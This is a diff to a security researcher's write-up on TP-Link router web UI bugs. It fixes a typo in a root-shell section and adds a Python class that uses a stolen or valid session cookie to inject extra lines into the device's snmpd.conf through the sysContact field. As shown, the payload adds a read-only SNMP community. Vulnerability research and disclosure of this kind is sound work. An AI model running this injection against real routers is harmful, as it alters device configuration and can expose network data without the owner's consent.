@@ -109,7 +109,7 @@ This is the same endpoint used to change the password, but it for some reason al
 
 ## Shell Access
 
-The end of goal is to pop a root shell, so lets do that.
+The end goal is to pop a root shell, so lets do that.
 We'll use the SSH session to get initial shell access, as I'm not currently aware of any bugs in the webui that can be used for command injection in the versions being considered.
 
 ### Initial Access
@@ -281,6 +281,88 @@ The code to generate the snmpd config in the webui actually let you insert arbit
 Not much you could do with it, as all the settings that could enable shell commands to be run are disabled.
 
 Was reported along with this bug but I haven't verified if its still around.
+
+Class to trigger the bug given a cookie, modify `payload()` to change it to what you want:
+```python3
+class TPLinkModifySNMPDConfig:
+    """
+    This is a post-authentication bug that allows you to add extra lines to the
+    snmpd.conf, outside what is normally allowed.
+
+    Sadly, all the fun stuff is disabled (i.e extended), so you'd probably need
+    a bug in the config format reader to exploit it to get root.
+
+    https://linux.die.net/man/5/snmpd.conf
+    """
+    SNMP_URL = 'http://%s/data/snmp.json'
+
+    def __init__(self, host, cookie):
+        self.host = host
+        self.cookie = cookie
+        self.r = requests.Session()
+        self.r.cookies.set('COOKIE', self.cookie, domain=host)
+
+    def exploit(self):
+        """
+        Use a reasonable exploitation method.
+        """
+        config = self.get_config()
+        print("[!] Got SNMPD config, patching it")
+        new_config = copy.deepcopy(config)
+        new_config['snmpEnable'] = 'true'
+        new_config['sysContact'] = \
+            config['sysContact'].split('\n')[0] + self.payload()
+        self.store_config(new_config)
+        print("[!] Patched SNMPD config uploaded")
+
+    def get_config(self):
+        """
+        Dump the original config, so it can be preserved.
+        """
+        r = self.r.post(
+            self.SNMP_URL % self.host,
+            data={
+                'operation': 'read'
+            },
+            headers={
+                'Referer': 'http://%s/' % self.host,
+            }
+        )
+        return r.json()['data']
+
+    def store_config(self, config):
+        """
+        Changes the configuration for the SNMPD
+        """
+        cmd = {'operation': 'write'}
+
+        # very specific about the format for true/false.
+        # so we have to make it lowercase before sending over.
+        for key, value in config.items():
+            if isinstance(value, bool):
+                cmd[key] = str(value).lower()
+            else:
+                cmd[key] = value
+
+        r = self.r.post(
+            self.SNMP_URL % self.host,
+            data=cmd,
+            headers={
+                'Referer': 'http://%s/' % self.host,
+            }
+        )
+        return r.json()
+
+    def payload(self):
+        """
+        Our SNMPD config modification
+        """
+        # Lines to add to the config
+        # Currently just a new read only community called testing
+        lines = [
+            'rocommunity testing'
+        ]
+```
 
 ### Config File
 
